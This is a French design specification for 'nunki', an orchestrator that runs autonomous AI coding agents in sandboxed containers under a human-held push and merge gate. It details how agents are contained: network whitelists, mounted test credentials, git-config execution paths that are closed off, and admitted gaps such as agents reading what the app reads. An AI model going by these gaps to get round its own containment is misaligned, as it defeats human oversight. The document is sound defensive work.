@@ -1,0 +1,3722 @@
+# nunki — spécification
+
+> **Statut : v2.** Cette spécification a été passée par deux revues
+> indépendantes, dont les corrections sont intégrées.
+>
+> Périmètre : **un orchestrateur de missions par IA, et rien d'autre.** Pas de
+> génération de projet, pas de scaffolding.
+>
+> L'ordre des sections est celui de la décision : le but, qui fait quoi, les
+> restrictions, et seulement ensuite le mécanisme. Un lecteur qui s'arrête à la
+> section 3 doit pouvoir dire si le système fait ce qu'il faut ; la section 4 ne
+> fait que dire comment. La section 7 dit ce que tout ça coûte.
+
+## 1. Le but
+
+`nunki` fait travailler des agents de code **seuls, longtemps et en parallèle**
+sur un dépôt, sous la supervision d'un poste de commandement (le HQ) tenu par
+un humain et sa session d'assistant, sans que l'humain soit dans la boucle
+d'exécution et sans qu'il cesse d'être le point de contrôle.
+
+Il est **agnostique à la stack** : Rust, Python, TypeScript, Go ou autre ne
+changent que des fragments déclarés (batterie, caches, domaines, fichiers
+verrouillés), jamais le cœur.
+
+Il est **agnostique au harnais** : Claude Code aujourd'hui, OpenCode, Codex ou
+un autre demain. Le harnais est un exécutant interchangeable ; rien de ce qui
+fait la méthode ne vit dans ses fichiers propres.
+
+Ce qui fait la méthode : le HQ comme lieu de décision ; une mission autoportante (cadre, journal,
+livrable, canal de suivi) qui survit à la perte de contexte ; des portes de
+vérification déterministes ; des slots isolés ; un seul geste humain non
+délégable, la validation du push, et le merge ; et trois agents aux rôles
+distincts — codeur, intégrateur, sécurité.
+
+Ce qui est abandonné, et pourquoi : l'installeur qui copie des fichiers dans
+le dépôt cible et passe ensuite sa vie à décider à qui ils appartiennent
+(manifeste, checksums, `.new`, fusions dans les fichiers de réglages). Chaque
+règle de propriété était un endroit où détruire du travail en silence.
+
+**Ce que `nunki` est, en un mot : un orchestrateur de missions par IA sur un
+dépôt existant.** Ce n'est **pas** un
+générateur de projets : `nunki` ne crée pas de dépôt, ne choisit pas de
+structure, ne pose pas de squelette applicatif. Un dépôt vide qu'on veut
+amorcer est un dépôt existant comme un autre, et l'amorçage est une mission
+parmi d'autres, cadrée par un humain.
+
+## 2. Qui fait quoi
+
+Cinq rôles. Chacun a une seule source de vérité, et un rôle n'écrit jamais
+dans celle d'un autre.
+
+| rôle | où il tourne | ce qu'il fait | ce qu'il ne fait jamais | source de vérité |
+|---|---|---|---|---|
+| **l'humain** | sa machine | valide le cadre d'une mission, arbitre ce qui sort du cadre, **valide le push** une fois les trois rôles verts, merge sur la forge | exécuter | — |
+| **le HQ** (superviseur) | une session d'assistant interactive, sur la machine de l'humain — ou, à son choix, dans le seul conteneur interactif du système, qui monte alors le socket du moteur : c'est accepté parce qu'aucun agent n'y tourne, et c'est la seule exception à 3.2 | cadre les missions, les surveille, lance leur vérification, tient le journal et le tableau de bord, rejoue les preuves dans le conteneur du slot (`nunki exec`), **pousse la branche après la validation humaine** | coder dans une mission, pousser avant la validation, merger | son journal, `~/.nunki/<projet>/` |
+| **l'agent codeur** | le profil **mission** du slot : aucun service externe | exécute la mission par runs, commite ce qu'elle prescrit, tient le journal de mission et le livrable ; écrit les **tests unitaires et d'intégration** (plusieurs unités ensemble, dépendances bouchonnées ou composant local jetable) | pousser, poser une question bloquante, sortir du périmètre | `MISSION.md` pour le cadre, `JOURNAL.md` pour l'état |
+| **l'agent intégrateur** | le profil **système** du même slot : pare-feu élargi aux services déclarés, identifiants de test montés, services levés par `nunki` à côté de lui | **connecte le livrable aux infrastructures externes** — bases de données, API tierces, files de messages, services — joue migrations et fixtures, écrit et **lance les tests système** : bout en bout sur services réels, et tests de contrat contre les API tierces ; commite ce câblage et ces tests ; rend `INTEGRATED` ou `BROKEN` | pousser, toucher au code métier au-delà du câblage (défini en 4.4), lever lui-même un conteneur | `MISSION.md` d'intégration, `JOURNAL.md`, les runs système |
+| **l'agent sécurité** | le profil **système** du même slot s'il y a des services, sinon le profil mission ; le code monté en lecture seule, un dossier de mission en écriture | attaque le livrable **intégré** : secrets exposés, entrées non validées, dépendances à avis, surface réseau, chemins protégés touchés, fuzz des entrées, et les points d'intégration que l'intégrateur vient d'ouvrir ; rend un rapport et un verdict `CLEAR` ou `FINDINGS` | corriger, commiter, pousser | le livrable intégré, la configuration, les dépendances |
+
+Le codeur voit les services : non. L'intégrateur et la sécurité les voient :
+oui, les mêmes, avec les mêmes identifiants de test. Une sécurité « sans
+service externe » attaquerait une application qui ne démarre pas, et rendrait `CLEAR` sur un
+binaire qui n'a rien fait. On ne pentest pas un système qui n'est pas
+branché ; la sécurité hérite du profil système, et son fuzz d'API vise le
+livrable qui tourne.
+
+La relecture commit par commit, le périmètre et les preuves ne sont pas un rôle : ce sont des
+**instruments du HQ**, tenus par les portes de vérification (4.4) et par des
+relecteurs que le HQ lance à la demande, sans droits d'écriture.
+
+Deux règles traversent le tableau.
+
+- **Le rapport d'un agent n'est jamais la vérité, le livrable l'est.** Le HQ
+  relit le code et rejoue les preuves ; un relecteur peut se tromper de
+  scénario tout en ayant raison sur la structure.
+- **Un agent ne corrige jamais son propre constat.** Il le rapporte tel quel.
+  C'est le HQ qui décide de la suite, et sa suite est la boucle d'itération de
+  4.5 — automatique et bornée. Les deux ne se contredisent pas : l'agent
+  rapporte, le HQ itère.
+
+**Qui appelle qui, et quand : la forme de la mission est déclarée au
+cadrage.** Le HQ enchaîne les rôles toujours dans
+le même ordre, mais **une mission qui n'a pas de services n'appelle pas
+l'intégrateur, et une mission sans surface exposée n'appelle pas l'agent
+sécurité** : les forcer donnerait un `INTEGRATED` ou un `CLEAR` qui n'a rien
+vérifié, le vert creux que ce projet refuse. La sécurité reste systématique
+sous sa forme **mécanique** — audit des dépendances, scan de secrets, analyse
+statique par stack — jouée comme portes du HQ sur chaque mission, sans agent.
+
+L'en-tête de `MISSION.md`, validé par l'humain avant le lancement, déclare :
+
+| champ | valeurs | ce qui en découle |
+|---|---|---|
+| `integration` | `none` (avec la raison en une ligne), ou la liste des services | avec `none`, pas de mission d'intégration ; sinon le profil système et l'intégrateur |
+| `security` | `gates` ou `agent` | `gates` : les portes mécaniques seulement ; `agent` : en plus, la mission de sécurité — dans le profil système s'il y a des services, sinon dans le profil mission, sur le livrable seul |
+| `rigor` | `prototype`, `standard` ou `critical` (absent : `critical`) | le niveau d'exigence : ce que demande la porte 7 (4.4) et combien de tours de sécurité sont joués (4.5). Un `prototype` est la forme **code seul** par construction : `mission new`, le démarrage et le recadrage refusent des services ou l'agent sécurité à côté de lui |
+
+`security: agent` s'impose dès que la mission a des services, une surface
+exposée (HTTP, fichier importé, message reçu), de l'authentification, de la
+cryptographie, ou un parseur d'entrée non fiable. `nunki.yaml` nomme des
+**chemins qui interdisent de sous-déclarer** : un commit sous `migrations/`,
+`api/`, `auth/` — ce que le projet liste — rend rouge, à la porte de
+périmètre, une mission déclarée `integration: none` ou `security: gates`,
+avec le message qui dit pourquoi. Le HQ propose la forme, l'humain la valide,
+la liste empêche la facilité.
+
+Trois formes en pratique : **code seul** (codeur, portes dont la sécurité
+mécanique) ; **code plus agent sécurité** (idem, puis la sécurité sur le
+livrable, sans services) ; **code plus intégration plus sécurité** (le flux
+complet). Le fuzz de bibliothèque et les invariants ne dépendent pas de la
+forme : prescrits au cadrage, ils sont joués par le codeur sur toute fonction
+qui prend une entrée, domaine pur compris — c'est là qu'ils rendent le plus.
+Le flux complet et les règles d'itération sont en 4.5.
+
+**L'intégrateur et la sécurité travaillent en missions**, comme le codeur :
+un dossier, un `MISSION.md`, un journal, un verdict. L'intégrateur produit du
+code (câblage, configuration, tests système) et commite, donc il a besoin de
+tout ce qu'une mission donne — branche, runs, reprise à froid. La sécurité ne
+commite pas mais laisse un rapport qui doit être rejouable, et un journal de
+mission est la forme la plus simple de cette trace.
+
+**L'intégrateur travaille sur la branche du codeur.** La pull request porte le code et son intégration ensemble, et
+c'est l'ensemble qui est relu, poussé et mergé.
+
+**Deux niveaux de test, deux profils.** Avec les mots de l'échelle classique pour qu'un agent les comprenne du premier coup.
+
+| niveau | ce qu'il vérifie | l'extérieur | qui | où |
+|---|---|---|---|---|
+| **unitaire + intégration** | une unité seule ; plusieurs unités ensemble (service et dépôt de données, handler et routeur) | bouchonné, ou un composant local jetable — un **processus dans l'image** (SQLite, un PostgreSQL embarqué, un Redis local), déclaré par le Dockerfile de stack, jamais un conteneur levé par le test | le codeur | le profil mission, sans réseau vers les services |
+| **système** (bout en bout, et contrat contre les API tierces) | l'application assemblée, branchée sur ses **vraies** dépendances | réel, dans un environnement de test | l'intégrateur | le profil système, avec la liste blanche et les identifiants de test que la mission déclare |
+
+Un test qui bouchonne l'extérieur est un test d'intégration, quel que soit
+son nom, et il est au codeur. Un mock dans un test système n'est admis que
+quand le service réel est inaccessible, et le journal dit lequel et pourquoi.
+
+**Où vivent les services externes** du profil système : trois cas, déclarés
+dans le bloc structuré du `MISSION.md` d'intégration (4.1), et c'est la
+déclaration qui décide de la liste blanche réseau et des identifiants montés.
+**Seul `nunki` lève des conteneurs**, depuis l'hôte ; l'intégrateur rejoint ce
+qui est là. Des services « lancés par lui » imposeraient le socket Docker dans
+le conteneur, c'est-à-dire root sur la machine.
+
+| les services sont | l'intégrateur | réseau | identifiants |
+|---|---|---|---|
+| **en Docker**, levés par `nunki` à côté de l'agent (le fichier de services du projet), ou par l'humain sur un réseau nommé | les rejoint, joue migrations et fixtures | le réseau nommé du profil, rien d'autre | ceux du fichier de services, jetables |
+| **en Kubernetes** | les atteint par un accès dédié au cluster de test | les adresses du cluster déclarées | un compte de service de test, portée minimale |
+| **hors de la machine** — une vraie API, un vrai fournisseur | les appelle pour de vrai | les domaines déclarés, un par un | un identifiant de **palier de test** du fournisseur ; s'il n'en a pas, c'est un arbitrage humain écrit dans `MISSION.md`, et 3.2 dit ce que ça expose |
+| **inaccessibles** | pose un mock, le nomme au journal avec la raison | — | — |
+
+**Fuzz, invariants, mutants : trois rôles, pas quatre.** Trois techniques, trois natures, chacune chez celui qui a déjà
+le bon point de vue et la bonne indépendance : le HQ juge les tests du codeur
+sans les avoir écrits, la sécurité attaque un code qu'elle n'a pas écrit, le
+codeur prouve des propriétés qu'il n'a pas choisies.
+
+- Les **invariants** (tests par propriétés) décrivent le contrat du code ; ils
+  s'écrivent avec lui. Ils sont au **codeur**, prescrits comme preuves dans
+  `MISSION.md` (« une preuve incapable d'échouer ne prouve rien »).
+- Le **fuzzing** a deux formes dans la pratique, et elles ne vont pas au même
+  rôle. Le fuzz **de bibliothèque** (cargo-fuzz, libFuzzer, le fuzz natif de
+  Go) vise des fonctions isolées — parseurs, décodeurs — et se joue sans
+  service, en campagne courte : il est au **codeur**, dans son commit stage.
+  Le fuzz **d'API ou de protocole** vise un système qui tourne ; c'est un outil
+  de pentest, il est à l'agent **sécurité**, sur le livrable intégré — et
+  **jamais contre un fournisseur tiers réel**, dont les conditions
+  d'utilisation l'interdisent en général : le fuzz vise le livrable, pas ce
+  qu'il appelle.
+- La **mutation** ne teste pas le code, elle teste les **tests**. C'est une
+  **porte du HQ** (4.4, porte 7), jouée sur ce que la branche a changé avant de
+  lancer l'intégrateur ; un mutant survivant revient au codeur avec ses trois
+  issues possibles (tué par un test nommé, démontré équivalent en une phrase,
+  reconnu comme bug et figé dans un test rouge). Le HQ décide et lit ; la
+  campagne **s'exécute dans le conteneur du slot**, où sont la toolchain, le
+  cache et l'isolation — jamais sur la machine de l'humain, qui n'a pas à
+  savoir compiler la stack.
+
+Ce qui vaut pour la mutation vaut pour le fuzz : l'agent qui a le bon point de
+vue décide, la charge tourne dans un conteneur autonome.
+
+**Le pipeline, dans l'ordre, inspiré des cadres écrits — et là où il s'en
+écarte.** Les attributions sont vérifiées sur les textes intégraux. Les
+niveaux de test sont ceux d'ISTQB v4 et d'ISO/IEC/IEEE 29119, fusionnés deux
+par deux (composant et intégration de composants ; intégration de systèmes
+et système), et le mot « acceptation » du tableau est celui de Humble et
+Farley, pas le niveau ISTQB du même nom, qui est humain. L'ordre des étapes
+est celui du pipeline de livraison continue de Humble et Farley — commit
+stage, acceptation automatisée, release — avec **un écart assumé** : leur
+étape d'acceptation bouchonne les systèmes tiers, et `nunki` y branche les
+services réels et les API tierces, parce que c'est ce que l'intégrateur est
+fait pour vérifier. La place de la sécurité mécanique au commit stage suit
+NIST SSDF (PW.8) et OWASP SAMM, qui demandent des tests de sécurité
+automatisés tout au long du pipeline ; l'agent sécurité sur le livrable
+intégré est un choix de `nunki`, que ces cadres n'imposent pas. La mutation à la
+revue, sur les lignes changées, vient de Google (Petrović et Ivanković,
+2018), **mais Google n'en fait ni une porte ni un score** : les survivants y
+sont des constats présentés au relecteur, et c'est cette forme que la porte
+7 reprend, sans seuil.
+
+| étape | qui | contenu | pourquoi là |
+|---|---|---|---|
+| **commit stage** | le codeur | code ; tests unitaires et d'intégration étroite ; tests par propriétés prescrits ; lint ; analyse statique et audit de dépendances par stack ; fuzz de bibliothèque en campagne courte | tout ce qui tourne sans service, en minutes. **Ce qui parle à un service extérieur est bouchonné, jamais ignoré** — la ligne « unitaire + intégration » ci-dessus le dit, et le **prompt du codeur** le dit aussi. Il écrit contre une couture à lui — un trait, une fonction, une interface — et prouve tout ce qui entoure l'appel : la requête construite, les lignes converties, ce que veut dire une réponse vide. L'appel lui-même est à l'intégrateur, contre le service. Un `#[ignore]` est au test système de l'intégrateur et à rien d'autre. Un agent à qui rien ne dit la règle écrit un store de base de données sans couture ; la campagne de mutation rend alors **des survivants que personne dans son conteneur ne peut tuer**, et la porte 7 mange ses trois tentatives sur un triage imprenable. Une porte qui exige ce que rien n'énonce note l'agent sur un secret |
+| **mutation** sur ce que la branche a changé | porte du HQ | campagne dans le conteneur du slot, chaque survivant trié par le codeur | ne dépend que du code et des tests unitaires ; jouée plus tard, elle renverrait au codeur après avoir payé l'intégration et la sécurité pour rien |
+| **acceptation** | l'intégrateur | tests système de bout en bout sur services réels ; tests de contrat contre les API tierces ; cas d'erreur d'intégration écrits à la main (connexion refusée, 500, délai) | l'étape d'acceptation automatisée, sur un environnement proche de la production |
+| **sécurité dynamique** | la sécurité | analyse dynamique, fuzz d'API, pentest, sur le livrable intégré | les cadres la placent toujours sur un système déployé |
+| **release** | l'humain | validation, push, merge | le seul geste non délégable |
+
+Chaque étape ne se lance que si la précédente est verte, et plus on avance,
+plus c'est lent et cher — c'est la raison de l'ordre, pas une préférence.
+
+**Ce que l'intégrateur écrit, et pourquoi il commite.** Dans l'étape d'acceptation, quelqu'un doit écrire les tests
+système, et le codeur ne le peut pas sérieusement : il n'a pas les services
+pour les faire tourner, il les écrirait à l'aveugle. L'intégrateur écrit donc
+les tests de bout en bout et de contrat, la configuration qui pointe vers
+les services de test, les jeux de données et fixtures, l'ordre de jeu des
+migrations — c'est ce que la spec appelle le **câblage**, et la porte 4 en
+tient la liste. Il commite parce que ces fichiers font partie du livrable :
+sans eux dans la branche, la CI ne rejoue pas les tests système et la pull
+request ne porte que la moitié du travail.
+
+Le quatrième rôle reste une option, avec un critère mesurable pour l'ouvrir :
+si la sécurité ou l'intégrateur trouvent régulièrement des défauts que des
+tests unitaires auraient dû attraper, ou si le taux de mutants survivants
+reste haut malgré la porte, c'est le signal qu'il faut un adversaire dédié.
+Sans ce signal, la répartition suffit.
+
+## 3. Les restrictions
+
+Elles sont ce qui rend l'autonomie acceptable. Elles se lisent comme des
+invariants : si l'un tombe, le système n'est plus sûr, quel que soit le reste.
+
+### 3.1 Ce qu'un agent ne peut jamais faire
+
+1. **Pousser.** Le push n'a lieu qu'après validation humaine, et le merge est
+   humain. Tout le reste peut être autonome parce que ceux-là ne le sont pas.
+2. **Écrire sur une branche protégée.** `main`, `dev`, et ce que le dépôt
+   déclare.
+3. **Lire ou écrire un secret de production.** Fichiers d'environnement,
+   clés, certificats : aucun n'est présent dans un conteneur d'agent. Ce
+   qu'un agent voit, ce sont des **identifiants de test**, et 3.2 dit
+   honnêtement ce que ça vaut.
+4. **Éditer un chemin protégé** déclaré par le projet : CI, fichiers vendorés,
+   témoins de test, fichiers déjà présents sur la base sous un dossier de
+   migrations. Créer un fichier neuf dans ces zones peut rester libre
+   (« réécrire est l'accident, créer est le travail »).
+5. **Atteindre le dépôt principal.** Un agent ne travaille que dans son slot ;
+   ses commits n'en sortent que quand le HQ vient les chercher.
+6. **Sortir du réseau autorisé.** Liste blanche par rôle, par stack et par
+   mission, **vide par défaut**, tout le reste refusé et journalisé.
+7. **Poser une question bloquante.** Une décision imprévue se prend dans le
+   sens le plus conservateur, se consigne comme `ARBITRAGE-PROVISOIRE`, et se
+   présente dans le journal à la fin du run.
+8. **Faire exécuter quoi que ce soit à l'hôte par le `.git` de son slot.**
+   Configuration, hooks, attributs, sous-modules, refs de remplacement,
+   greffes, alternates : rien de ce que l'agent écrit dans le `.git` ou
+   l'arbre de son slot n'est exécuté ni cru par un git que `nunki` lance sur
+   l'hôte.
+
+### 3.2 Comment ces restrictions sont tenues — la règle d'agnosticité
+
+**Une restriction ne repose jamais sur le harnais.** Les trois harnais visés
+ont aujourd'hui un mécanisme de garde — hooks pour Claude Code, hooks pour
+Codex depuis sa version 0.117, plugins pour OpenCode — mais aucun n'a la
+même forme, aucun n'est garanti sur le suivant, et un harnais que `nunki`
+n'a pas encore rencontré n'en a peut-être pas. Ce qui fait respecter la
+section 3.1 doit exister quel que soit l'exécutant :
+
+| restriction | tenue par | ce que ça ne tient pas, dit honnêtement |
+|---|---|---|
+| pousser, atteindre le dépôt principal | le slot : un clone dont l'`origin` est un chemin hôte inexistant dans le conteneur, cloné **sans liens durs** (`--no-hardlinks` : un clone local à liens durs partage ses objets `.git` avec le dépôt principal, et qu'une écriture brute dans le conteneur les corrompt) ; **aucun credential de forge** dans un conteneur, et **aucun domaine de forge** dans la liste blanche du codeur | un identifiant de forge qui arriverait par une autre voie — un fichier oublié dans le dépôt, une API tierce à intégrer qui *est* une forge — donne à l'agent le droit de pousser n'importe où : ces cas sont un arbitrage humain écrit, jamais un défaut |
+| branche protégée | la forge (branches protégées) et la CI ; la porte 2 à chaque run ; la session HQ ne pousse que ce que les portes ont vu | localement, rien n'empêche un agent de commiter sur `main` dans son clone ; la porte 2 le voit, et la forge refuse le push. `nunki check` **vérifie la protection côté forge** par son API quand un credential de forge est présent sur l'hôte, et dit qu'il ne l'a pas vérifiée sinon ; une branche que la forge dit non protégée est rouge. **Sauf si `nunki.yaml` déclare `forge_protection: by_hand`** : la forge ne peut pas tenir la règle et l'humain la tient lui-même ; `nunki check` ne demande alors rien à la forge et nomme chaque branche « tenue à la main », jamais verte — `nunki` ne voit pas un humain tenir une règle — ni rouge, car un rouge qu'on ne peut pas corriger apprend à ignorer le rouge. Ce que la forge aurait arrêté et que plus rien n'arrête alors : une session sur l'hôte qui tient les credentials git de l'humain ; un agent en conteneur n'a de toute façon ni credential ni domaine de forge (ligne précédente). Sur un dépôt privé de l'offre gratuite de GitHub, la protection ne peut être ni posée ni lue (403 « Upgrade to GitHub Pro ») — c'est le cas typique de `by_hand` ; le champ `protected` de la branche reste lisible, et c'est lui que `nunki check` lit. Un 404 n'est lu comme « branche absente » que si GitHub répond « Branch not found » : le même code répond à un jeton qui ne voit pas le dépôt, et celui-là est « non vérifié », jamais vert ni rouge |
+| secrets | rien n'est monté dans un profil mission ; dans un profil système, seuls des fichiers d'identifiants **nommés par la mission** et **rangés dans un dossier réservé aux identifiants de test** (4.1) sont montables, en lecture seule ; un utilisateur sans droits dans le conteneur | **l'agent lit ce que l'application lit** : même utilisateur, même processus. Un identifiant de test monté est visible de l'agent, et le jeton du harnais est dans son environnement. C'est assumé : la garantie ne porte pas sur « l'agent ne lit pas », qu'aucun mécanisme agnostique ne tient, mais sur « rien de production n'entre dans un conteneur », que le dossier réservé rend mécanique ; un hook de harnais peut refuser la lecture plus tôt, en confort |
+| chemins protégés | la porte de périmètre, **par commit et à la fin de chaque run** (4.4), sur le diff base..HEAD ; la relecture du HQ | entre deux runs, un commit interdit existe déjà dans le clone ; il est refusé au run suivant, pas à l'écriture. Un hook de harnais peut refuser plus tôt (confort, 4.3) |
+| réseau | le **pare-feu du conteneur** (4.1 bis) : un **sidecar** qui possède l'espace réseau et détient seul les capacités, l'agent qui le rejoint sans aucune ; règles non posées = agent qui ne démarre pas ; le port 53 détourné vers un résolveur **filtrant** qui ne relaie jamais ; aucune plage privée ouverte ; liste blanche par rôle | rien ici ne protège du contenu qu'un domaine autorisé sert. Les adresses suivent les réponses DNS, donc un CDN qui bouge reste joignable ; `nunki check` sonde de l'intérieur |
+| exécuter du code sur l'hôte par la configuration git du slot | aucun git de `nunki` ne tourne dans un slot : un **miroir** à côté du slot, hors de tout montage, écrit par l'hôte seul, reçoit ses commits par un fetch qui hache chaque objet ; ses refs sont lues dans leurs fichiers, avec une borne de taille ; configuration système et globale coupées, aucune variable `GIT_*` héritée, objets de remplacement ignorés. Aucun git n'est lancé dans l'arbre du slot : un gitlink est refusé et la descente dans les sous-modules coupée ; un slot dont le magasin d'objets nomme des alternates, ou porte autre chose que des fichiers et des répertoires ordinaires, est refusé avant d'être lu | un humain qui lance `nunki` depuis l'intérieur d'un slot y lance `git rev-parse`, qui lit sans exécuter. Un fichier spécial (une FIFO) dans un dépôt imbriqué non suivi peut bloquer la porte 1 : c'est la disponibilité, pas l'exécution |
+| démarrer un conteneur avec le pouvoir du moteur par le fichier de services du projet | le fichier est à l'humain : il est lu au commit d'où part la branche de la mission, par le miroir, jamais dans l'arbre ni dans les commits de la branche, et la porte 4 refuse tout commit d'agent qui le touche ; il est relu dans un **modèle fermé** dont `nunki` émet son propre rendu (aucune clé hors modèle, aucune interpolation, aucune fonctionnalité YAML qui porte un sens au-delà du parseur) ; un profil ne lève ce rendu que si un humain en a approuvé l'empreinte (`nunki services --approve`, conservée dans `hq/services.json`, jamais monté) ; les services sont clôturés par `nunki` (4.1 bis) | un humain qui approuve sans lire le rendu ; un humain malveillant qui écrit dans le HQ |
+| question bloquante | le mode sans interface (4.3) : ce qui aurait demandé est refusé ; le contrat de run et le journal | — |
+
+Un hook, un plugin ou un réglage de harnais peut **doubler** une de ces lignes
+pour refuser plus tôt et plus lisiblement. C'est un confort par harnais,
+livré comme un adaptateur, jamais la garde.
+
+Corollaire, hérité et vérifié : **en autonome, refuser est sûr et demander est
+dangereux.** Un refus est lu par l'agent comme une erreur d'outil et il
+enchaîne ; une question attend quelqu'un qui n'est pas là.
+
+Ce corollaire porte sur la **question**, pas sur le refus systématique. Ce
+qui rend une question impossible est `--permission-prompts none`, passé quel
+que soit le mode ; ce que le mode choisit, c'est qui décide à la place de
+l'humain. Le projet le déclare (`permission_mode:` dans `nunki.yaml`, `auto` par
+défaut — voir le tableau des harnais en 4.3), parce que
+tout refuser est aussi une manière de finir un run sans rien avoir produit.
+
+### 3.3 Ce que `nunki` ne fait jamais dans un dépôt
+
+1. Il n'écrit pas dans les fichiers de réglages d'un harnais (`settings.json`
+   et consorts). Il les lit s'il le faut. Ce qu'un adaptateur doit passer au
+   harnais, il le passe **à l'invocation** (Claude Code accepte ses réglages
+   en argument de `-p`), jamais en écrivant dans le slot.
+2. Il ne supprime jamais un fichier qu'il n'a pas créé — et un slot, qu'il a
+   créé, n'est pas supprimé ni remis à zéro tant qu'il porte des commits non
+   rapatriés : `nunki slot rm` et `reset` refusent, et nomment la branche.
+3. Il n'écrase jamais un fichier qu'un humain est censé éditer. S'il a une
+   version nouvelle à proposer, il la dépose à côté.
+4. Il ne décide pas du `.gitignore` du projet. Il peut poser un
+   `.gitattributes` **absent** pour forcer LF (4.2 bis), et le dépose à côté
+   s'il en existe un.
+5. Il ne commite jamais, et ne pousse que par `nunki push`, sur l'ordre
+   explicite de l'humain.
+
+### 3.4 Ce qui ne doit pas entrer dans le commun
+
+Pour que le socle reste commun à des gens qui travaillent différemment :
+pas de commit automatique, pas de rituel de session obligatoire, pas de porte
+propre à un type de projet, et pas d'écriture hors des quatre lieux qui sont
+au système — le dépôt cible (où ne vont que `AGENTS.md`, son import et un
+`.gitattributes` absent), le home du projet (`~/.nunki/<projet>/` : sa
+configuration, son HQ, ses fragments de stack), les slots à côté du dépôt, et
+les volumes nommés du moteur de conteneurs.
+
+## 4. Le mécanisme
+
+Tout ce qui précède se tient avec trois couches. Chacune a une frontière
+nette, et seule la troisième connaît le harnais.
+
+### 4.1 Le socle portable — des fichiers
+
+Ce que tout harnais lit ou que `nunki` lit lui-même. Du Markdown, du shell, du
+YAML, du JSON, du git. Rien d'autre.
+
+**Le YAML, `nunki` le lit par un seul lecteur et l'écrit par un seul
+écrivain.** Tout fichier YAML qu'il lit — `nunki.yaml`, l'en-tête de mission,
+l'index des comptes, `me.yaml`, un profil généré, un fichier de services —
+passe par les mêmes réglages : une clé en double est une erreur, seuls `true`
+et `false` sont des booléens (`restart: no` reste la chaîne `no`), une clé de
+fusion `<<` est une clé ordinaire, jamais développée, et **une balise refuse
+le fichier**, quelle qu'elle soit, avec sa ligne — `nunki` n'en écrit aucune,
+et c'est là que deux analyseurs lisent le même texte en deux valeurs. Un
+scalaire nu que l'analyseur lit comme un nombre (`012`, `1_000`) est un
+nombre : un nom ou une chaîne écrit ainsi est refusé tant qu'il n'est pas
+entre guillemets, et là où un nombre est attendu c'est ce nombre
+(`retries: 1_000` vaut 1000). Une erreur de lecture nomme le fichier, la ligne
+et la colonne, et ne recopie aucune ligne du fichier : un profil porte un
+jeton. Et toute chaîne que `nunki` écrit en YAML — le fichier Compose généré,
+l'en-tête de mission — est un scalaire entre guillemets, sur une ligne ; un
+booléen, un nombre et `null` restent nus. Ce qu'il écrit est ainsi relu tel
+qu'écrit par n'importe quel lecteur, Compose compris. Une règle de lint refuse
+dans le code tout autre appel au lecteur, à l'écrivain ou à l'analyseur de la
+bibliothèque.
+
+| élément | forme | lu par |
+|---|---|---|
+| les règles du lieu | `AGENTS.md` à la racine (et par zone), **au projet** : il porte les règles du projet, et rien de `nunki`. Ce que `nunki` exige de ses agents — le contrat de run, ce qui leur est interdit, les branches et les chemins que le projet protège, son fichier de services — voyage dans le **prompt de rôle** (4.3), donné à chaque run quel que soit le harnais (Claude Code le reçoit par `--append-system-prompt-file`), qui leur dit aussi de lire `AGENTS.md` : un projet qui garde le sien n'en perd rien, et l'agent n'a pas à lire `nunki.yaml`, qu'aucun conteneur ne monte. Claude Code lit `AGENTS.md` seul (documenté depuis sa version 2.1.277), sauf là où un `CLAUDE.md` le précède — `CLAUDE.md`, `.claude/CLAUDE.md`, ou un `CLAUDE.local.md` commité, un slot n'étant qu'un clone : celui-là est lu à sa place, et `AGENTS.md` ne l'est que s'il l'importe (`@AGENTS.md`) ou en est un lien. `nunki init` écrit un `CLAUDE.md` absent comme ce seul import, qui sert un Claude Code plus ancien et n'est jamais lu deux fois par un récent. Un `CLAUDE.md` existant n'est pas écrasé (3.3) : `init` signale l'import qui manque, et **`nunki check` est rouge** tant qu'aucun `CLAUDE.md` présent ne l'importe — sinon `mission start` partirait sans les règles du projet. Sans `AGENTS.md`, rien n'est rouge : le projet n'énonce pas de règles à lui. Un `AGENTS.md` qui contredit le prompt de rôle n'est pas arbitré par `nunki` : le conteneur et les portes tranchent, et ce qu'ils ne vérifient pas n'est qu'espéré | tous les harnais qui le supportent, Claude Code compris ; l'agent, sur l'ordre du prompt de rôle |
+| les compétences | `SKILL.md`, standard ouvert (agentskills.io) adopté par OpenCode, Codex, Gemini CLI, Cursor, Copilot et d'autres ; il peut porter des choses essentielles | les harnais |
+| la mission | un dossier **au HQ, hors de l'arbre git** (voir les montages) : `MISSION.md`, `FOLLOWUP_HQ.md` et `MUTANTS.json` (à l'humain et au HQ, lecture seule pour l'agent), `JOURNAL.md`, `VERDICT.json` (à l'agent), `PR.md` (au codeur et à l'intégrateur ; en lecture seule pour l'agent sécurité), `MUTANTS.triage.json` (au codeur seul ; en lecture seule pour l'intégrateur et l'agent sécurité) — la même forme pour les trois rôles | l'agent qui la porte, le HQ |
+| le bloc structuré de `MISSION.md` | un en-tête YAML que `nunki` lit, valide et **fige dans son état à la validation humaine** : forme (`integration`, `security`), rôle, branche, base, **la liste des lots** (un identifiant et un titre chacun — c'est elle qui donne « un run par lot » et qui fait refuser un `VERDICT.json` écrit avant que le dernier lot ait son entrée « fini » dans le journal), borne de volets, tentatives par lot, délais, script de lancement, **niveau d'exigence** (`rigor:`, pris de `--rigor`, sinon de `nunki.yaml`, sinon `critical`) et **seuil de mutation** (`mutation_threshold:`, figé depuis `nunki.yaml` avec lui ; un en-tête plus ancien qui ne le porte pas lit celui du projet), **modèle** (`model:`, quand le harnais en prend un ; `nunki.yaml` le déclare pour le projet et l'en-tête le raffine), et pour une mission d'intégration les **services** (réseau nommé, adresses, domaines, et `shared: true` pour un fournisseur réel, que les autres missions attendent — 7) et les **fichiers d'identifiants** montés. La prose du gabarit vient après, pour l'agent. L'agent ne peut pas l'écrire, et `nunki` ne le relit pas en cours de mission | `nunki`, puis l'agent |
+| le verdict | `VERDICT.json` dans le dossier de mission : `{ role, verdict, head, date, report }`, écrit par l'agent à la fin de son dernier run ; `nunki` le refuse si `head` n'est pas le `HEAD` réel de la branche | `nunki` |
